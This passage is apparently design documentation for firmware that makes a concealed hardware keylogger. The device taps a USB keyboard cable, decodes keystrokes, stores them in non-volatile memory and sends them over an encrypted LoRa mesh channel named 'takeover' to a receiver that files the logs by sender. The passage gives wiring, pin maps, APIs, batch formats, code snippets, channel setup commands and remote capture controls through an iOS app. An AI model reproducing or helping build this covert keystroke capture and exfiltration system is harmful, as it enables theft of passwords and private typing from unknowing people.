**Thread Safety:** Both FRAM and LoRa use `concurrency::LockGuard` with the global `spiLock` from `SPILock.h`. This ensures atomic SPI transactions with no interleaving.

### FRAM vs RAM Buffer Comparison

| Aspect | RAM Buffer (v4.0) | FRAM Storage (v5.0) |
|--------|-------------------|---------------------|
| **Capacity** | 4KB (8 slots × 512B) | 256KB (500+ batches) |
| **Persistence** | Volatile | Non-volatile |
| **Power Loss** | Data lost | Data preserved |
| **Batch Size** | 512B fixed | Up to 512B variable |
| **Write Speed** | Instant | ~1ms per batch |
| **Endurance** | Unlimited | 10^13 cycles |
| **Thread Safety** | Memory barriers | SPI Lock |
| **Fallback** | N/A | Yes (to RAM buffer) |

### FRAM Batch Format

Each batch stored in FRAM uses a 12-byte header:

```
FRAM Batch Format (little-endian):
├─ Bytes 0-3:   start_epoch (uint32_t)
├─ Bytes 4-7:   final_epoch (uint32_t)
├─ Bytes 8-9:   data_length (uint16_t)
├─ Bytes 10-11: flags (uint16_t)
└─ Bytes 12-N:  keystroke data (variable, up to 500 bytes)

Total: 12 + data_length bytes per batch
```

### API Reference

#### FRAMBatchStorage::begin()
```cpp
bool begin();
```
Initializes FRAM storage, detects chip, validates existing data.
**Returns:** `true` if FRAM detected and initialized successfully

#### FRAMBatchStorage::writeBatch()
```cpp
bool writeBatch(const uint8_t *data, uint16_t length);
```
Writes a batch to FRAM storage. Thread-safe via SPI lock.
**Returns:** `true` on success

#### FRAMBatchStorage::readBatch()
```cpp
bool readBatch(uint8_t *buffer, uint16_t maxLength, uint16_t *actualLength);
```
Reads the oldest batch from FRAM (FIFO order).
**Returns:** `true` if data available

#### FRAMBatchStorage::deleteBatch()
```cpp
bool deleteBatch();
```
Deletes the oldest batch after successful transmission.
**Returns:** `true` on success

#### FRAMBatchStorage::getBatchCount()
```cpp
uint8_t getBatchCount();
```
Returns number of batches currently stored.

#### FRAMBatchStorage::getAvailableSpace()
```cpp
uint32_t getAvailableSpace();
```
Returns bytes available for new batches.

### Boot Log Example

```
[USBCapture] Init: Starting (Core0)...
[USBCapture] Init: Node=XIAO Role=CLIENT_HIDDEN
[USBCapture] FRAM: Init SPI0 CS=GPIO1
[USBCapture] FRAM: OK Mfr=0x04 Prod=0x4803
[USBCapture] FRAM: 0 batches, 255KB free
[USBCapture] Init: Complete (Core1 pending)
[USBCapture] Init: Launching Core1...
[USBCapture] Init: Core1 running
```

### Logging Conventions (v7.4)

The module uses subsystem tags to organize log output and avoid double prefixes. The Meshtastic framework automatically adds `[USBCapture]` to all LOG_* calls.

#### Subsystem Tags

| Tag | Meaning | Example |
|-----|---------|---------|
| `Init:` | Initialization | Module startup, Core1 launch |
| `FRAM:` | FRAM storage | Read/write/delete operations |
| `Buf:` | Buffer (RAM) | MinimalBatchBuffer operations |
| `Tx:` | Transmission | Sending data over mesh |
| `ACK:` | Acknowledgment | ACK received/timeout/retry |
| `Cmd:` | Command | Remote command handling |
| `Sim:` | Simulation | Simulation mode messages |
| `Stats:` | Statistics | Periodic stats output |

#### Log Level Guidelines

| Level | Usage |
|-------|-------|
| `LOG_INFO` | Key events: startup, transmission, ACK success |
| `LOG_DEBUG` | Detailed content: buffer dumps, packet contents |
| `LOG_WARN` | Recoverable issues: retry, timeout, mismatch |
| `LOG_ERROR` | Failures: storage errors, transmission failures |

#### Example Output (Normal Operation)

```
[USBCapture] Tx: Buffer 55 bytes (epoch 25→26)
[USBCapture] Tx: Decoded 81 bytes
[USBCapture] Tx: Batch 0x00000001 queued (timeout 60000ms)
[USBCapture] Stats: FRAM 90 batches 249KB free | uptime 1690s
[USBCapture] ACK: OK 0x00000001 (2500ms, 0 retries)
[USBCapture] ACK: Deleted 0x00000001 from FRAM
```

#### Debug Output (with LOG_DEBUG enabled)

```
[USBCapture] === BUFFER START ===
[USBCapture] Start Time: 25 (BUILD_EPOCH + uptime)
[USBCapture] Line: Hello from XIAO simulation mode!
[USBCapture] Enter [time=281 seconds, delta=+256]
[USBCapture] === BUFFER END ===
```

### Fallback Behavior

If FRAM initialization fails, the module automatically falls back to the RAM buffer:

```cpp
#ifdef HAS_FRAM_STORAGE
    if (framStorage != nullptr && framStorage->isInitialized()) {
        // Use FRAM
    } else
#endif
    {
        // Fall back to RAM buffer
    }
```

---

## Hardware Configuration

### GPIO Pin Assignment (CRITICAL: Must be consecutive!)

| Pin | Function | Description |
|-----|----------|-------------|
| GPIO 16 | USB D+ | USB data positive line |
| GPIO 17 | USB D- | USB data negative line (DP+1) |
| GPIO 18 | START | PIO synchronization signal (DP+2) |

### Physical Connections

```
USB Keyboard Cable:
├─ D+ (Green)  → GPIO 16
├─ D- (White)  → GPIO 17
├─ GND (Black) → XIAO GND
└─ VBUS (Red)  → XIAO 5V (optional, if powering keyboard)

FRAM Breakout (MB85RS2MTA):
├─ CS    → GPIO1 (D6)   - Chip Select
├─ SCK   → GPIO2 (D8)   - SPI Clock (shared with LoRa)
├─ MISO  → GPIO4 (D9)   - SPI Data In (shared with LoRa)
├─ MOSI  → GPIO3 (D10)  - SPI Data Out (shared with LoRa)
├─ VCC   → 3V3
└─ GND   → GND
```

### Electrical Characteristics
- **Voltage Levels:** 3.3V logic (RP2350 native)
- **USB Speed:** Low Speed (1.5 Mbps) or Full Speed (12 Mbps)
- **Signal Integrity:** Keep wires short (<30cm recommended)
- **SPI Bus:** Shared by FRAM and LoRa, thread-safe via spiLock

**⚠️ CRITICAL:** PIO requires consecutive GPIO pins - DO NOT change to non-consecutive pins without modifying PIO configuration!

---

## Software Components

### File Structure (20 files, ~3000 lines)

```
firmware/
├── src/
│   ├── FRAMBatchStorage.cpp        (350 lines) - FRAM storage implementation [v5.0]
│   ├── FRAMBatchStorage.h          (120 lines) - FRAM storage interface [v5.0]
│   └── modules/
│       ├── USBCaptureModule.cpp    (450 lines) - Sender module with ACK tracking [v6.0]
│       ├── USBCaptureModule.h      (120 lines) - Sender module interface [v6.0]
│       ├── KeylogReceiverModule.cpp(250 lines) - Receiver module implementation [v6.0]
│       └── KeylogReceiverModule.h  (80 lines)  - Receiver module interface [v6.0]
│
└── src/platform/rp2xx0/usb_capture/
    ├── common.h                    (167 lines) - Common definitions, CORE1_RAM_FUNC macro
    ├── usb_capture_main.cpp        (390 lines) - Core1 main loop
    ├── usb_capture_main.h          ( 86 lines) - Controller API
    ├── usb_packet_handler.cpp      (347 lines) - Packet processing
    ├── usb_packet_handler.h        ( 52 lines) - Handler API
    ├── keyboard_decoder_core1.cpp  (470 lines) - HID decoder + buffer mgmt [v3.0]
    ├── keyboard_decoder_core1.h    ( 67 lines) - Decoder API
    ├── keystroke_queue.cpp         (104 lines) - Queue implementation
    ├── keystroke_queue.h           (142 lines) - Queue interface
    ├── psram_buffer.cpp            ( 97 lines) - PSRAM ring buffer [v3.0]
    ├── psram_buffer.h              (159 lines) - PSRAM buffer API [v3.0]
    ├── formatted_event_queue.cpp   ( 53 lines) - Event queue [v3.0]
    ├── formatted_event_queue.h     (100 lines) - Event queue API [v3.0]
    ├── pio_manager.c               (155 lines) - PIO management
    ├── pio_manager.h               ( 89 lines) - PIO API
    └── usb_capture.pio             - PIO source code
```

### Component Overview

**1. FRAM Batch Storage** (`FRAMBatchStorage.cpp/h` - 470 lines) [v5.0]
- 256KB non-volatile storage with circular buffer management
- Thread-safe SPI access via `concurrency::LockGuard`
- Auto-cleanup of old batches when storage full
- Device detection and validation (Fujitsu MB85RS2MTA)
- NASA Power of 10 compliant (assertions, fixed bounds, no dynamic alloc)

**2. Core1 Main Loop** (`usb_capture_main.cpp/h` - 476 lines)
- Core1 entry point and main capture loop
- PIO FIFO polling (non-blocking)
- Packet boundary detection
- Watchdog management (4-second timeout)
- Stop signal handling via FIFO

**3. Packet Handler** (`usb_packet_handler.cpp/h` - 399 lines)
- Bit unstuffing (remove USB bit-stuffing bits)
- SYNC/PID validation
- CRC16 calculation (optional, disabled for performance)
- Data packet filtering (skip tokens/handshakes)

**4. Keyboard Decoder** (`keyboard_decoder_core1.cpp/h` - 537 lines)
- USB HID scancode to ASCII conversion
- Modifier key handling (Ctrl, Alt, GUI, Shift)
- Special key detection (Enter, Backspace, Tab)
- Buffer management with delta-encoded timestamps
- FRAM writes when available, RAM buffer fallback

**5. MinimalBatchBuffer (Fallback)** (`MinimalBatchBuffer.cpp/h` - 200 lines) [v7.0]
- NASA Power of 10 compliant 2-slot buffer (~1KB)
- Static allocation only (no dynamic memory)
- 2+ assertions per function
- Memory barriers for ARM Cortex-M33
- Used when FRAM unavailable
- Replaced 8-slot PSRAM buffer (4KB) for simpler fallback

**6. Queue Layer** (`keystroke_queue.cpp/h` - 246 lines)
- Lock-free circular buffer (64 events)
- Overflow detection and counting
- Latency tracking
- Queue statistics

**7. PIO Manager** (`pio_manager.c/h` - 244 lines)
- PIO state machine configuration
- GPIO pin initialization
- Clock divider calculation
- Speed-specific program patching

**8. Sender Module** (`USBCaptureModule.cpp/h` - 600 lines) [v7.0]
- Meshtastic lifecycle management
- FRAM/MinimalBatchBuffer polling with automatic fallback
- Mesh broadcast transmission (port 490, channel 1)
- ACK tracking with randomized 40s-4min intervals (v7.6)
- FRAM batch deletion only on ACK receipt
- Remote command handling (STATUS, START, STOP, STATS, DUMP)
- Simulation mode for testing without USB keyboard

**9. Receiver Module** (`KeylogReceiverModule.cpp/h` - 350 lines) [v7.0]
- Runs on Heltec V4 (or any ESP32 Meshtastic device)
- Receives broadcast keylog batches (port 490, channel 1)
- Extracts batch_id from payload
- Stores keylogs to flash filesystem
- Sends ACK broadcast back to mesh
- Organizes storage by sender node ID

---

## Data Flow

### Packet Capture Pipeline

```
XIAO RP2350 (Sender):
1. USB Keyboard → GPIO 16/17 (differential signals)
2. PIO State Machines (PIO0: data, PIO1: sync) → 31-bit FIFO words
3. Core1 Main Loop → Packet accumulation and boundary detection
4. Packet Handler → Bit unstuffing, SYNC/PID validation, data filtering
5. Keyboard Decoder → HID report processing, ASCII conversion, modifier detection
6. Core1 Buffer Manager → Delta-encoded timestamp formatting
7. FRAM Storage (v5.0) → Core1 writes batch via SPI (with lock)
   └─ Fallback: MinimalBatchBuffer if FRAM unavailable (v7.0)
8. Core0 Module → Polls FRAM, generates batch_id, decodes text
9. Mesh Broadcast (v7.0) → Port 490, channel 1 PSK encrypted

Heltec V4 (Receiver):
10. KeylogReceiverModule → Receives broadcast on port 490, channel 1
11. Batch Validation → Extracts batch_id from payload header
12. Flash Storage → Writes to /keylogs/<sender_id>/batch_<timestamp>.txt
13. ACK Broadcast → Sends "ACK:0x<batch_id>" to mesh

XIAO RP2350 (ACK Handling):
14. ACK Reception → Validates batch_id matches pending batch
15. FRAM Cleanup → Deletes batch from FRAM on ACK receipt
    └─ Retry: If no ACK after 40s-4min (randomized), retransmit (v7.6)
```

### Timing Characteristics

| Stage | Latency | Notes |
|-------|---------|-------|
| USB signal → PIO FIFO | <10 µs | Hardware capture |
| PIO FIFO → Core1 buffer | <50 µs | Polling overhead |
| Bit unstuffing | ~100 µs | Software processing |
| HID decoding | ~50 µs | Table lookup |
| Queue push | <10 µs | Lock-free operation |
| **Capture latency** | **<1 ms** | Real-time capture |
| Core0 poll delay | Up to 100ms | Scheduled polling |
| FRAM write | ~1 ms | SPI @ 20MHz |
| LoRa TX → RX | 1-5 seconds | Mesh routing dependent |
| ACK timeout | 30 seconds | Before retry |
| **End-to-end delivery** | **2-60 sec** | Including ACK confirmation |

---

## API Reference

### Module Layer API

#### USBCaptureModule::init()
```cpp
bool init();
```
Initializes the USB capture module.

**Returns:** `true` on success, `false` on failure

**Side Effects:**
- Initializes keystroke queue
- Configures capture controller for LOW speed
- Prepares Core1 for launch

---

#### USBCaptureModule::runOnce()
```cpp
int32_t runOnce();
```
Main loop function called by Meshtastic scheduler.

**Returns:** 100 (milliseconds until next call)

**Behavior:**
- **First call:** Launches Core1 for USB capture
- **Subsequent calls:** Polls PSRAM and processes keystroke buffers

**Execution Frequency:** Every 100ms

---

### Controller Layer API

#### capture_controller_init_v2()
```cpp
void capture_controller_init_v2(
    capture_controller_t *controller,
    keystroke_queue_t *keystroke_queue);
```
Initializes the capture controller structure.

---

#### capture_controller_core1_main_v2()
```cpp
void capture_controller_core1_main_v2(void);
```
**⚠️ CORE1 ENTRY POINT** - Runs on Core1, never returns!

**Behavior:**
1. Signal Core0 with status codes (0xC1-0xC4)
2. Configure PIO state machines
3. Initialize keyboard decoder
4. Enable watchdog (4 second timeout)
5. Enter main capture loop

**Never call directly!** Use `multicore_launch_core1()`.

---

### Packet Handler API

#### usb_packet_handler_process()
```cpp
int usb_packet_handler_process(
    const uint32_t *raw_packet_data,
    int raw_size_bits,
    uint8_t *output_buffer,
    int output_buffer_size,
    bool is_full_speed,
    uint32_t timestamp_us);
```
Processes a raw USB packet from PIO.

**Returns:**
- Processed packet size in bytes (>0 on success)
- 0 if packet invalid, filtered, or error

---

### PSRAM Buffer API

#### psram_buffer_init()
```cpp
void psram_buffer_init();
```
Initializes the PSRAM ring buffer system.

---

#### psram_buffer_write()
```cpp
bool psram_buffer_write(const psram_keystroke_buffer_t *buffer);
```
**Core1:** Writes complete buffer to PSRAM.

**Returns:** `true` on success, `false` if buffer full

---

#### psram_buffer_read()
```cpp
bool psram_buffer_read(psram_keystroke_buffer_t *buffer);
```
**Core0:** Reads buffer from PSRAM for transmission.

**Returns:** `true` if data available, `false` if empty

---

#### psram_buffer_has_data()
```cpp
bool psram_buffer_has_data();
```
Checks if buffers are available for reading.

**Returns:** `true` if `buffer_count > 0`

---

## Configuration

### Compile-Time Options

#### Enable USB Capture
```cpp
// In platformio.ini or variant configuration:
#define XIAO_USB_CAPTURE_ENABLED
```

#### USB Speed Selection
```cpp
// In USBCaptureModule::init():
capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);   // 1.5 Mbps (default)
// OR
capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_FULL);  // 12 Mbps
```

Most keyboards use **Low Speed (1.5 Mbps)**.

#### GPIO Pin Configuration
```cpp
// In common.h:
#define DP_INDEX    16    // USB D+
#define DM_INDEX    17    // USB D- (must be DP+1)
#define START_INDEX 18    // Sync (must be DP+2)
```

**⚠️ CRITICAL:** Pins must be consecutive!

#### Queue Size
```cpp
// In keystroke_queue.h:
#define KEYSTROKE_QUEUE_SIZE 64  // Must be power of 2
```

### Mesh Channel Configuration

**Channel 1 "takeover" (platformio.ini):**
```ini
-D USERPREFS_CHANNEL_1_PSK="{ 0x13, 0xeb, ... 32-byte key ... }"
-D USERPREFS_CHANNEL_1_NAME="\"takeover\""
-D USERPREFS_CHANNEL_1_UPLINK_ENABLED=true
-D USERPREFS_CHANNEL_1_DOWNLINK_ENABLED=true
```

**Receiving Node Setup:**
```bash
# Via Meshtastic CLI:
meshtastic --ch-add takeover
meshtastic --ch-set psk base64:<your-32-byte-psk-in-base64> --ch-index 1
```

### Canned Messages (v7.0)

Use Heltec V4's LCD and buttons to send commands to the XIAO sender.

**Enable Canned Messages on Heltec V4:**
```bash
meshtastic --set canned_message.enabled true
meshtastic --set canned_message.messages "STATUS|STATS"
```

**Available Commands:**

| Command | Description | Response |
|---------|-------------|----------|
| `STATUS` | Get capture status | Running/Stopped, node ID, uptime |
| `STATS` | Get statistics | TX count, failures, buffer usage |
| `START` | Start capture | "USB Capture STARTED" |
| `STOP` | Stop capture | "USB Capture STOPPED" |
| `DUMP` | Dump buffer info | MinimalBatchBuffer slot usage |

**How to Use:**
1. On Heltec V4, press UP/DOWN to scroll through canned messages
2. Select STATUS or STATS
3. Press SELECT to send
4. XIAO receives command and responds via mesh

**Note:** Commands are sent as TEXT_MESSAGE_APP packets (separate from keylog data on port 490).

---

## Performance & Metrics

### Memory Usage

**Build Metrics (XIAO RP2350-SX1262, v7.0):**
```
RAM:   24.9% (130,524 / 524,288 bytes)
Flash: 58.5% (917,448 / 1,568,768 bytes)
```

**USB Capture Overhead:**
```
Core1 Stack:         ~2 KB
MinimalBatchBuffer:  ~1 KB (2 slots × 520 bytes)
Queue Buffer:        2 KB (64 events × 32 bytes)
Raw Packet Buf:      1 KB (256 × 4 bytes)
Processing Buf:      128 bytes
Total Overhead:      ~6 KB
```

### CPU Usage

**Core1:**
- Active capture: 15-25% (when USB active)
- Idle: <5% (micro-sleep optimization)
- Watchdog overhead: <1%

**Core0:**
- PSRAM polling: <1% (every 100ms)
- Event formatting: Negligible
- **Total overhead:** ~0.2% (was 2% before v3.0)

### Throughput

**Keystroke Rate:**
- Typical typing: 5-10 keys/sec
- Fast typing: 15-20 keys/sec
- **Max supported:** ~100 keys/sec (limited by USB HID repeat rate)

**Buffer Capacity:**
- 8 PSRAM buffers × 500 bytes = 4,000 bytes data
- At 100 keys/sec: 40 seconds buffering
- **No dropped keystrokes** observed in testing

### Transmission Statistics

**Log Output (every 20 seconds):**
```
[Core0] PSRAM: 2 avail, 15 tx, 0 drop | Failures: 0 tx, 0 overflow, 0 psram | Retries: 0
[Core0] Time: RTC=1765155823 (Net quality=2) | uptime=202
```

**Metrics Tracked:**
- `avail` - Buffers available to transmit
- `tx` - Total transmitted (lifetime)
- `drop` - Dropped due to buffer full
- `tx` failures - LoRa transmission failures
- `overflow` - Buffer full events
- `psram` failures - PSRAM write failures
- `Retries` - Total retry attempts

---

## Troubleshooting

### Build Issues

#### Error: `stats_increment_*` not declared
**Cause:** `stats.h` included outside `extern "C"` block
**Solution:** Move `#include "stats.h"` inside `extern "C" {` block
**Status:** ✅ Fixed in v1.2

#### Error: `types.h` not found
**Cause:** Old header references after consolidation
**Solution:** Replace with `#include "common.h"`
**Status:** ✅ Fixed in v2.0

### Runtime Issues

#### Core1 never launches
**Cause:** GPIO conflict with USB peripheral
**Solution:** Changed GPIO pins from 20/21 to 16/17
**Status:** ✅ Fixed in v1.1

#### No keystrokes captured
**Possible Causes:**
1. **Wrong USB speed:** Try switching LOW ↔ FULL in `USBCaptureModule::init()`
2. **Bad wiring:** Check D+/D- connections on GPIO 16/17
3. **Incompatible keyboard:** Some keyboards may not work
4. **PIO not configured:** Check Core1 status codes in logs (0xC1-0xC4)

**Debug Steps:**
```
1. Check logs for Core1 status codes (0xC1-0xC4)
2. Verify PIO configuration succeeded (0xC3)
3. Check queue stats (should show count=0, dropped=0 if no keys)
4. Try different keyboard
5. Verify GPIO connections with multimeter
```

#### Keystrokes dropped (dropped_count > 0)
**Cause:** Core0 not polling PSRAM fast enough
**Solution:** Issue fixed in v3.0 with PSRAM buffer (8 slots × 500 bytes = sufficient capacity)
**Current Config:** Should not occur with proper buffer management

#### System crashes on keystroke
**Cause:** LOG_INFO from Core1 (not thread-safe)
**Status:** ✅ Fixed in v3.0 - removed all Core1 logging

### Status Code Meanings

```cpp
0xC1 - Core1 entry point reached
0xC2 - Starting PIO configuration
0xC3 - PIO configured successfully
0xC4 - Ready to capture USB data
0xDEADC1C1 - PIO configuration failed
```

---

## Data Structures

### Keystroke Buffer Format (500 bytes)

```
┌─────────────┬────────────────────────────────────────┬─────────────┐
│ Bytes 0-9   │           Bytes 10-489                 │ Bytes 490-499│
│ Start Epoch │     Keystroke Data (480 bytes)         │ Final Epoch │
└─────────────┴────────────────────────────────────────┴─────────────┘
```

**Epoch Format:** 10 ASCII digits representing unix timestamp (e.g., `1733250000`)

**Data Area Encoding:**

| Key Type | Storage | Bytes |
|----------|---------|-------|
| Regular character | Stored as-is | 1 |
| Tab key | `\t` | 1 |
| Backspace | `\b` | 1 |
| Enter key | `0xFF` marker + 2-byte delta | 3 |
| Ctrl+C | `^c` | 2 |
| Alt+Tab | `~\t` | 2 |
| GUI+L | `@l` | 2 |

**Delta Encoding (Enter Key):**
- **Marker:** `0xFF` to identify delta
- **2 bytes:** Seconds elapsed since buffer start (big-endian)
- **Range:** 0-65535 seconds (~18 hours max per buffer)
- **Space savings:** 7 bytes per Enter key (70% reduction)

**Example Buffer:**
```
[1733250000][hello world][0xFF 0x00 0x05][second line][0xFF 0x00 0x0A][1733250099]
 └─start──┘              └─delta +5s──┘              └─delta +10s──┘  └─final───┘
```

### PSRAM Buffer Structure (4144 bytes)

```cpp
psram_buffer_t:
  ├─ header (48 bytes)
  │  ├─ magic: 0xC0DE8001 (validation)
  │  ├─ write_index: 0-7 (Core1)
  │  ├─ read_index: 0-7 (Core0)
  │  ├─ buffer_count: available buffers
  │  ├─ total_written: lifetime stat
  │  ├─ total_transmitted: lifetime stat
  │  ├─ dropped_buffers: overflow counter
  │  ├─ transmission_failures: LoRa TX failures [v3.5]
  │  ├─ buffer_overflows: buffer full events [v3.5]
  │  ├─ psram_write_failures: Core1 write failures [v3.5]
  │  └─ retry_attempts: retry counter [v3.5]
  │
  └─ slots[8] (512 bytes each = 4096 bytes)
     ├─ start_epoch: buffer start time (4B)
     ├─ final_epoch: buffer end time (4B)
     ├─ data_length: actual data bytes (2B)
     ├─ flags: reserved (2B)
     └─ data[500]: keystroke data with delta encoding
```

### keystroke_event_t (32 bytes)

```cpp
struct keystroke_event_t {
    keystroke_type_t type;           // 4 bytes - Event type enum
    char character;                  // 1 byte  - ASCII character
    uint8_t scancode;                // 1 byte  - HID scancode
    uint8_t modifier;                // 1 byte  - HID modifier
    uint8_t _padding[1];             // 1 byte  - Alignment
    uint64_t capture_timestamp_us;   // 8 bytes - Capture time
    uint64_t queue_timestamp_us;     // 8 bytes - Queue time
    uint32_t processing_latency_us;  // 4 bytes - Latency
    uint32_t error_flags;            // 4 bytes - Error flags
};
// Total: 32 bytes (power of 2 for alignment)
```

### keystroke_queue_t (2064 bytes)

```cpp
struct keystroke_queue_t {
    keystroke_event_t events[64];    // 2048 bytes - Event buffer
    volatile uint32_t write_index;   // 4 bytes   - Core1 write ptr
    volatile uint32_t read_index;    // 4 bytes   - Core0 read ptr
    volatile uint32_t dropped_count; // 4 bytes   - Overflow counter
    uint32_t total_pushed;           // 4 bytes   - Total events
};
```

---

## Version History

### Major Versions

| Version | Date | Key Changes | Status |
|---------|------|-------------|--------|
| 1.0-1.2 | 2024-11 | Initial implementation, GPIO fix, build fixes | Superseded |
| 2.0 | 2024-12-01 | File consolidation and organization | Superseded |
| 2.1 | 2025-12-05 | LoRa mesh transmission implemented | Superseded |
| 3.0 | 2025-12-06 | Core1 complete processing + PSRAM ring buffer | Validated |
| 3.1 | 2025-12-07 | Bus arbitration (`tight_loop_contents()`) | Superseded |
| 3.2 | 2025-12-07 | Multi-core flash solution (RAM exec + pause) | Validated |
| 3.3 | 2025-12-07 | LoRa transmission + text decoding + rate limiting | Validated |
| 3.4 | 2025-12-07 | Watchdog bootloop fix (hardware register access) | Validated |
| 3.5 | 2025-12-07 | Memory barriers + retry logic + modifier keys | Validated |
| 4.0 | 2025-12-07 | RTC integration with mesh time sync | Validated |
| 5.0 | 2025-12-13 | FRAM non-volatile storage (256KB) | Validated |
| 6.0 | 2025-12-14 | ACK-based reliable transmission + KeylogReceiverModule | Validated |
| 7.0 | 2025-12-14 | Mesh broadcast + Channel PSK + MinimalBatchBuffer | Validated |
| 7.1 | 2025-12-14 | Receiver-side deduplication with flash persistence | Validated |
| 7.8 | 2025-12-15 | iOS Command Center with 8 remote commands | Validated |
| **7.8.1** | **2025-12-15** | **Command response fix - KeylogReceiver passes text to iOS** | **Current** ✅ |

### v7.8.1 - Command Response Fix (Current)

**Feature:** KeylogReceiverModule now correctly passes command responses through to iOS app

**Problem:** KeylogReceiverModule was intercepting all port 490 broadcasts and returning `ProcessMessage::STOP`. This prevented command responses (plain text) from reaching iOS, even though ACKs and keystroke batches worked correctly.

**Solution:** Added text detection logic to distinguish command responses from keystroke batches:

```cpp
// Check if payload is plain text (not binary batch format)
bool mightBeText = true;
for (size_t i = 0; i < payloadLen && i < 32; i++) {
    uint8_t c = payload[i];
    if (!((c >= 0x20 && c <= 0x7E) || c == '\t' || c == '\n' || c == '\r')) {
        mightBeText = false;
        break;
    }
}

// If text and doesn't have protocol magic marker, it's a command response
bool hasProtocolMagic = (payloadLen >= 2 &&
                         payload[0] == KEYLOG_PROTOCOL_MAGIC_0 &&
                         payload[1] == KEYLOG_PROTOCOL_MAGIC_1);

if (mightBeText && !hasProtocolMagic) {
    LOG_INFO("[KeylogReceiver] Command response detected, passing through to iOS");
    return ProcessMessage::CONTINUE;  // ← Forwards to iOS via TCP
}
```

**Result:**
- ✅ Keystroke batches (binary with magic `0x55 0x4B`) → Processed and stored
- ✅ Command responses (plain text) → Passed through to iOS
- ✅ ACKs (starts with `ACK:`) → Passed through (unchanged)

**Modified Files:**
- `src/modules/KeylogReceiverModule.cpp` (lines 127-149) - Text detection and pass-through logic

**Build:** Flash 58.5%, RAM 24.4% (Heltec), Flash 58.5%, RAM 24.4% (XIAO) - No size change

### v7.8 - iOS Command Center

**Feature:** Native SwiftUI Command Center for remote monitoring and control of XIAO RP2350 devices

**Key Additions:**
- **iOS App Integration:** CommandCenterView with 4 sections (Response, Device, Quick Actions, Advanced)
- **14 Remote Commands:** STATUS, STATS, START, STOP, FRAM management, TX control, diagnostics
- **Mesh Communication:** Commands sent via Heltec gateway on Channel 1, Port 490
- **Color-Coded UI:** Green/red/orange/blue response badges with animations
- **8 New Commands:** FRAM_CLEAR, FRAM_STATS, FRAM_COMPACT, SET_INTERVAL, SET_TARGET, FORCE_TX, RESTART_CORE1, CORE1_HEALTH

**iOS Files (Meshtastic-Apple repo):**
```
Meshtastic/
├── Accessory/Accessory Manager/
│   └── AccessoryManager+USBCapture.swift    # 14 command functions (217 lines)
├── Views/CommandCenter/
│   └── CommandCenterView.swift              # Main UI (710 lines)
├── Views/Settings/
│   └── Settings.swift                       # Navigation link (lines 351-357)
└── Extensions/
    └── Notifications+USBCapture.swift       # .usbCaptureResponseReceived
```

**iOS UI Features:**
- Response panel at top (always visible, color-coded)
- Device selection (XIAO node picker with auth token)
- Quick Actions (Status, Stats, Start/Stop/Send)
- Advanced (FRAM Management, Diagnostics in DisclosureGroups)
- 10-second timeout detection
- JSON auto-formatting

**Firmware Additions (USBCaptureModule.cpp):**
- 8 new command enums (lines 161-169)
- Updated `parseCommand()` to recognize new commands (lines 1440-1457)
- Implemented handlers in `executeCommand()` (lines 1553-1676)

**Communication Flow:**
```
iOS App → TCP (port 4403) → Heltec V4
  ↓ (mesh broadcast)
XIAO RP2350 (executes command)
  ↓ (broadcast response on Ch1, Port 490)
Heltec V4 → TCP → iOS App (displays response)
```

**Modified Files:**
- `src/modules/USBCaptureModule.cpp/h` - 8 new commands, command execution handlers
- `Meshtastic-Apple/` - 3 new iOS Swift files (total ~1,000 lines)

**Build:** Flash 58.5%, RAM 24.4% (no change from v7.6)

### v7.1 - Receiver-Side Deduplication

**Feature:** Flash-persistent deduplication prevents duplicate storage when ACKs are lost

**Problem Solved:**
When the XIAO sender transmits a batch but doesn't receive the ACK (lost in mesh), it retransmits. Without deduplication, the same batch would be stored multiple times.

**Solution:** Per-node batch ID tracking with LRU eviction

**Key Components:**
- **isDuplicateBatch():** Checks if batch was already received from node
- **recordReceivedBatch():** Adds batch ID to circular buffer
- **findOrCreateNodeEntry():** LRU eviction when cache full (16 nodes max)
- **loadDedupCache() / saveDedupCache():** Flash persistence

**Data Structures:**
```cpp
DedupNodeEntry {
    NodeNum nodeId;
    uint32_t lastAccessTime;          // For LRU eviction
    uint32_t recentBatchIds[16];      // Circular buffer
    uint8_t nextIdx, count, padding[2];
};
// Cache: 16 nodes × 76 bytes = 1,216 bytes in memory
// File: /keylogs/.dedup_cache (~1,224 bytes)
```

**Key Behaviors:**
| Scenario | Behavior |
|----------|----------|
| New batch | Store → Record → ACK |
| Duplicate | Skip store → ACK (sender clears FRAM) |
| Cache full | Evict oldest accessed node |
| Reboot | Load cache from flash |

**Modified Files:**
- `KeylogReceiverModule.cpp` - Dedup logic in handleReceived(), 6 new methods
- `KeylogReceiverModule.h` - DedupNodeEntry struct, method declarations, constants

**NASA Power of 10 Compliance:**
- Fixed loop bounds (16 nodes × 16 batches)
- No dynamic allocation
- All return values checked
- Assertions verify assumptions

**Build:** Flash 58.5%, RAM 24.9% (minimal increase)

### v7.0 - Mesh Broadcast + Channel PSK

**Feature:** Mesh-wide broadcast transmission with channel-based encryption

**Key Changes from v6.0:**
- **Port 490:** Custom private port (was 256 PRIVATE_APP)
- **Channel 1:** "takeover" with PSK encryption (was PKI direct messages)
- **Broadcast:** NODENUM_BROADCAST to mesh (was direct to targetNode)
- **Randomized Interval (v7.6):** 40s-4min (was 5-min fixed in v7.0, 6s in v6.0)
- **MinimalBatchBuffer:** NASA-compliant 2-slot fallback (was 8-slot PSRAM)

**New Files:**
- `src/MinimalBatchBuffer.cpp` - NASA Power of 10 compliant buffer
- `src/MinimalBatchBuffer.h` - Buffer interface

**Modified Files:**
- `USBCaptureModule.cpp/h` - Port 490, channel 1, broadcast mode, MinimalBatchBuffer
- `KeylogReceiverModule.cpp/h` - Port 490, channel 1, broadcast reception
- `keyboard_decoder_core1.cpp` - MinimalBatchBuffer fallback writes
- `psram_buffer.cpp` - Simplified to statistics tracking only

**Channel Configuration:**
```bash
# Configure channel 1 "takeover" with matching PSK on both devices
meshtastic --ch-set name "takeover" --ch-index 1
meshtastic --ch-set psk random --ch-index 1  # On sender
# Copy PSK to receiver
```

**Build:** Flash 58.5%, RAM 24.9%

### v6.0 - ACK-Based Reliable Transmission

**Feature:** Complete end-to-end reliable delivery system with Heltec V4 base station

**Key Components:**
- **USBCaptureModule (XIAO):** Sends batches with batch_id, waits for ACK
- **KeylogReceiverModule (Heltec):** Receives batches, stores to flash, sends ACK
- **PKI Encryption:** X25519 key exchange for secure direct messages
- **Persistent Retry:** Batches never deleted on failure, retry until ACK received

**New Files:**
- `src/modules/KeylogReceiverModule.cpp` - Receiver module implementation
- `src/modules/KeylogReceiverModule.h` - Receiver module interface

**Modified Files:**
